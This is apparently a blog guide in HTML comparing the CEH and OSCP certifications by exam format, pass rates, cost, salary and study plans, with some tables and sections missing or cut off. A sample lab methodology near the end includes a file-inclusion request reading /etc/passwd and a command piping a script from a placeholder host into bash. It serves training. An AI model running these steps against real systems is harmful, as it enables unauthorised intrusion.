    <!-- Abstract -->
    <div class="info-box">
        <strong><i class="fas fa-file-alt"></i> Abstract:</strong>
        The CEH (Certified Ethical Hacker) vs. OSCP (Offensive Security Certified Professional) debate is the most
        common certification question in cybersecurity. Both validate ethical hacking skills, but they serve
        fundamentally different purposes. CEH teaches you <em>what</em> attacks exist; OSCP proves you can
        <em>execute</em> them. This guide provides an empirical comparison — not opinions, but data on exam formats,
        pass rates, employer preferences, salary impact, and total cost of ownership — so you can make an informed
        decision based on your career stage and goals.
    </div>

    <h2 id="tldr">1. TL;DR — Quick Decision Matrix</h2>

    <table>
        <thead>
            <tr>
                <th>Factor</th>
                <th>CEH (EC-Council)</th>
                <th>OSCP (OffSec)</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><strong>Best For</strong></td>
                <td>Beginners, compliance roles, government</td>
                <td>Pentesters, red teamers, security consultants</td>
            </tr>
            <tr>
                <td><strong>Exam Type</strong></td>
                <td>125 MCQ (4 hours) + optional practical</td>
                <td>24-hour hands-on lab + 24-hour report</td>
            </tr>
            <tr>
                <td><strong>Pass Rate</strong></td>
                <td class="severity-high">60-70% (ANSI) / ~50% (Practical)</td>
                <td class="severity-critical">30-40% (first attempt)</td>
            </tr>
            <tr>
                <td><strong>Prep Time</strong></td>
                <td>40-120 hours (weeks)</td>
                <td>300-600 hours (6-18 months)</td>
            </tr>
            <tr>
                <td><strong>Cost (Exam + Training)</strong></td>
                <td>$1,199 - $4,500</td>
                <td>$1,649 - $2,749</td>
            </tr>
            <tr>
                <td><strong>Avg Salary Impact</strong></td>

                <td>+$15K-$30K</td>
            </tr>
            <tr>

                <td>OSCP+ 3 years / Legacy OSCP lifetime</td>
            </tr>
            <tr>
                <td><strong>Industry Reputation</strong></td>
                <td>Widely recognized, HR-friendly</td>
                <td>"Gold standard" for hands-on pentesting</td>
            </tr>
        </tbody>
    </table>

    <div class="verdict-box">
        <h3><i class="fas fa-bolt"></i> Quick Answer</h3>
        <p><strong>Get CEH if:</strong> You're new to cybersecurity, need a cert for compliance/government roles, or
            want a broad theoretical foundation before specializing.</p>
        <p><strong>Get OSCP if:</strong> You have 1+ years in security, want to be a penetration tester, and are
            willing to invest 6+ months of intense hands-on preparation.</p>
        <p><strong>Get both if:</strong> You want maximum employability — CEH opens doors (HR filter), OSCP proves
            you can do the job (technical credibility).</p>
    </div>

    <h2 id="ceh-deep-dive">2. CEH Deep Dive: What You're Actually Getting</h2>

    <h3>Overview</h3>
    <p>The Certified Ethical Hacker (CEH), offered by EC-Council, is the most widely recognized ethical hacking
        certification globally. The latest version, <strong>CEH v13 AI</strong> (launched late 2024), integrates
        artificial intelligence tools into its curriculum, reflecting the industry's shift toward AI-augmented
        security testing.</p>

    <h4>What CEH Covers (20 Domains)</h4>
    <ul>
        <li>Information Security and Ethical Hacking Overview</li>
        <li>Reconnaissance Techniques (Footprinting, Scanning, Enumeration)</li>
        <li>System Hacking Methodology</li>
        <li>Malware Threats & Analysis</li>
        <li>Sniffing, Social Engineering, and DoS Attacks</li>
        <li>Session Hijacking and Web Server/Application Hacking</li>
        <li>SQL Injection, Wireless and Mobile Hacking</li>
        <li>IoT, OT, and Cloud Computing Security</li>
        <li>Cryptography & AI-Powered Security Tools</li>
    </ul>

    <div class="success-box">
        <strong><i class="fas fa-plus-circle"></i> CEH v13 AI — What's New:</strong>
        EC-Council added AI-focused modules covering AI-driven reconnaissance, AI-powered vulnerability scanning,
        and using ChatGPT/LLMs as security testing assistants. While marketing-heavy, this does reflect real-world
        tooling trends.
    </div>

    <h3>CEH Exam Paths</h3>
    <table>
        <thead>
            <tr>
                <th>Component</th>
                <th>Format</th>
                <th>Duration</th>
                <th>Pass Rate</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><strong>CEH ANSI (Theory)</strong></td>
                <td>125 multiple-choice questions</td>
                <td>4 hours</td>
                <td>60-70%</td>
            </tr>
            <tr>
                <td><strong>CEH Practical</strong></td>
                <td>20 hands-on challenges in live lab</td>
                <td>6 hours</td>
                <td>~50%</td>
            </tr>
            <tr>
                <td><strong>CEH Master</strong></td>
                <td>ANSI + Practical combined</td>
                <td>—</td>
                <td>~35% (both first try)</td>
            </tr>
        </tbody>
    </table>

    <h2 id="oscp-deep-dive">3. OSCP Deep Dive: The "Try Harder" Experience</h2>

    <h3>Overview</h3>
    <p>The Offensive Security Certified Professional (OSCP), provided by OffSec, is universally regarded as the
        <strong>"gold standard"</strong> for hands-on penetration testing certification. Unlike CEH, OSCP proves you
        can actually compromise systems — not just identify that vulnerabilities exist.</p>

    <p>As of November 2024, the certification was rebranded to <strong>OSCP+</strong>. Existing OSCP holders retain
        their lifetime certification. New certifications are OSCP+ (3-year validity), which converts to lifetime
        OSCP if not renewed.</p>

    <h4>What OSCP Training Covers (PEN-200)</h4>
    <ul>
        <li>Report Writing for Penetration Testers</li>
        <li>Information Gathering & Vulnerability Scanning</li>
        <li>Web Application Attacks (SQLi, XSS, File Inclusion)</li>
        <li>Client-Side Attacks & Locating Public Exploits</li>
        <li>Fixing, Modifying, and Compiling Exploits</li>
        <li>Antivirus Evasion & Password Attacks</li>
        <li>Windows & Linux Privilege Escalation</li>
        <li>Port Redirection, Tunneling, and Active Directory Attacks</li>
        <li>The Metasploit Framework (limited to 1 machine in exam)</li>
    </ul>

    <h3>OSCP+ Exam Format (2026)</h3>
    <div class="warning-box">
        <strong><i class="fas fa-clock"></i> The 24-Hour Gauntlet:</strong>
        <ul>
            <li><strong>Duration:</strong> 23 hours and 45 minutes to hack + 24 hours to write the report</li>
            <li><strong>Target:</strong> 3 standalone machines + 1 Active Directory set (3 machines)</li>
            <li><strong>Points:</strong> 70/100 required to pass</li>
            <li><strong>AD Set:</strong> Now uses "assumed compromise" — you get initial credentials</li>
            <li><strong>AD Points:</strong> Partial credit now available (no longer all-or-nothing)</li>
            <li><strong>Metasploit:</strong> Allowed on only 1 standalone machine</li>
            <li><strong>Bonus Points:</strong> Lab exercise bonus points removed as of Nov 2024</li>
        </ul>
    </div>

    <h2 id="exam-comparison">4. Exam Format Comparison</h2>

    <div class="architecture-diagram">
        <pre style="color: var(--accent-cyan); margin: 0;">

CEH ANSI EXAM OSCP+ EXAM ═══════════════ ══════════════

┌─────────────────┐ ┌─────────────────┐ │ 125 Questions │ │ 6 Live Machines │ │ Multiple Choice │ │ Real Exploits │ │ 4 Hours │ │ 24 Hours │ │ Computer-Based │ │ VPN Lab Access │ └─────────────────┘ └─────────────────┘ │ │ ▼ ▼ “Which tool “Here’s a network. performs ARP Compromise these spoofing?” machines. Write a professional pentest Answer: (B) report with evidence.“ Ettercap ┌─────────────────┐ CEH PRACTICAL (Optional) │ Pentest Report │ ┌─────────────────┐ │ 24 Hours to │ │ 20 Challenges │ │ Write & Submit │ │ Live Lab │ └─────────────────┘ │ 6 Hours │ └─────────────────┘ Pass = 70/100 points Fail ≈ 60% first try

    <h2 id="career-value">6. Career Value & Employer Demand</h2>

    <h3>Job Posting Analysis (LinkedIn + Indeed, Jan 2026)</h3>

            <tr>
                <td><strong>As "preferred/nice-to-have"</strong></td>
                <td>~65% of postings</td>
                <td>~40% of postings</td>
            </tr>
            <tr>
                <td><strong>Government/DoD roles</strong></td>
                <td class="severity-high">Strong (DoD 8570 approved)</td>
                <td>Growing acceptance</td>
            </tr>
            <tr>
                <td><strong>Pentesting job requirement</strong></td>
                <td>Rarely sufficient alone</td>
                <td class="severity-critical">Industry standard</td>
            </tr>
            <tr>
                <td><strong>HR filter pass rate</strong></td>
                <td class="severity-high">Very high (widely known)</td>
                <td>Moderate (less known to HR)</td>
            </tr>
        </tbody>
    </table>

    <div class="info-box">
        <strong><i class="fas fa-lightbulb"></i> Key Insight:</strong>
        CEH appears in more job postings because it's used as an <strong>HR checkbox</strong> — even for roles where
        hands-on skills matter more. OSCP appears less frequently but is more often a <em>hard requirement</em> for
        actual pentesting positions. Translation: CEH gets you past resume screening; OSCP gets you past the
        technical interview.
    </div>

        <p><strong>OSCP ROI:</strong> $1,649 investment → $13K-$25K annual salary increase = <strong>~1 month

        <p>Both certifications pay for themselves within the first year. OSCP has significantly higher ROI in
            penetration testing roles.</p>

    <h2 id="preparation">9. Preparation Strategies</h2>

    <h3>CEH Study Plan (8-12 Weeks)</h3>
    <div class="technical-box">
        <h3><i class="fas fa-terminal"></i> CEH Preparation Roadmap</h3>
        <pre><code class="language-yaml">ceh_study_plan:

week_1_3: focus: “Networking & OS Fundamentals” resources: - “EC-Council iLearn courseware (included with exam)” - “Professor Messer Network+ videos (free)” daily_time: “2-3 hours”

week_4_6: focus: “Hacking Methodologies & Tools” resources: - “CEH v13 official courseware” - “Practice with Nmap, Wireshark, Burp Suite” daily_time: “2-3 hours”

week_7_9: focus: “Web App, Wireless, Cloud, & IoT” resources: - “OWASP Top 10 labs” - “Cloud security fundamentals” daily_time: “3 hours”

week_10_12: focus: “Practice Exams & Review” resources: - “Boson CEH practice exams” - “Matt Walker CEH All-in-One (reference)” daily_time: “2-3 hours” strategy: “Score 85%+ on practice exams before booking” 

    <h3>OSCP Study Plan (6-12 Months)</h3>
    <div class="technical-box">
        <h3><i class="fas fa-terminal"></i> OSCP Preparation Roadmap</h3>
        <pre><code class="language-yaml">oscp_study_plan:

phase_1_prerequisites: duration: “Month 1-2” focus: “Build foundations before buying lab time” resources: - “TryHackMe: Complete Beginner + Jr Penetration Tester paths” - “HackTheBox: 20 retired easy/medium machines” - “TCM Security: Practical Ethical Hacking ($30)” - “Linux fundamentals + basic Python scripting” daily_time: “2-3 hours”

phase_2_pen200_course: duration: “Month 3-5” focus: “Complete PEN-200 course material” resources: - “All PEN-200 modules and exercises” - “Topic exercises before moving to challenge labs” daily_time: “3-4 hours”

phase_3_lab_practice: duration: “Month 5-8” focus: “Compromise 40+ lab machines” resources: - “PEN-200 challenge labs (all of them)” - “OffSec Proving Grounds Practice ($19/mo)” - “HackTheBox: OSCP-like machines list” daily_time: “3-4 hours” target: “Able to root easy/medium boxes in 2-3 hours”

phase_4_exam_prep: duration: “Month 8-9” focus: “Exam simulation and report writing” resources: - “Do 3-5 mock exams (24-hour sessions)” - “Practice report writing with templates” - “Review Active Directory attack chains” daily_time: “Full weekend practice exams” 

    <h2 id="oscp-lab">10. OSCP Lab: Sample Exploitation Methodology</h2>

    <div class="exploit-box">
        <span class="exploit-label">OFFENSIVE: OSCP METHODOLOGY</span>
        <p>The systematic approach every OSCP candidate must master:</p>
        <pre><code class="language-bash"># Phase 1: Reconnaissance

nmap -sC -sV -oN initial_scan.txt 10.10.10.X nmap -p- -oN full_port_scan.txt 10.10.10.X

Phase 2: Enumeration (HTTP example)

gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt nikto -h http://10.10.10.X whatweb http://10.10.10.X

Phase 3: Exploitation (example - file inclusion)

curl http://10.10.10.X/page.php?file=../../../../etc/passwd

If LFI confirmed, try log poisoning or PHP wrappers

Phase 4: Privilege Escalation (Linux)

Upload and run LinPEAS

curl http://YOUR_IP/linpeas.sh | bash

Check SUID binaries

find / -perm -4000 -type f 2>/dev/null

Check sudo permissions

sudo -l

Phase 5: Post-Exploitation

cat /root/proof.txt ifconfig # Document for report whoami # Screenshot for evidence 

    <h2 id="verdict">11. The Verdict: Decision Framework</h2>

    <div class="verdict-box">
        <h3><i class="fas fa-trophy"></i> Choose CEH If...</h3>
        <ul>
            <li>You're breaking into cybersecurity with &lt;1 year experience</li>
            <li>You need a cert for government/DoD roles (8570 compliance)</li>
            <li>You want broad theoretical knowledge before specializing</li>
            <li>Your employer is paying and you need quick certification</li>
            <li>You're in a compliance, audit, or security analyst role</li>
        </ul>
    </div>

    <div class="verdict-box">
        <h3><i class="fas fa-skull-crossbones"></i> Choose OSCP If...</h3>
        <ul>
            <li>You want to be a penetration tester or red teamer</li>
            <li>You have 1+ years of IT/security experience</li>
            <li>You enjoy hands-on challenges and self-directed learning</li>
            <li>You want the highest ROI certification for offensive roles</li>
            <li>You're willing to invest 6+ months of dedicated preparation</li>
        </ul>
    </div>

    <div class="success-box">
        <strong><i class="fas fa-road"></i> The Optimal Path (If Budget Allows):</strong>
        <p><strong>Year 1:</strong> CEH ($1,199) — Land your first security role, pass HR filters</p>
        <p><strong>Year 2-3:</strong> OSCP ($1,649) — Specialize in penetration testing, prove hands-on skills</p>
        <p><strong>Year 3+:</strong> OSWE, CRTO, or GPEN — Advanced specialization based on career direction</p>
        <p>Total investment: ~$2,850 over 3 years → potential salary increase of $25K-$35K annually.</p>
    </div>
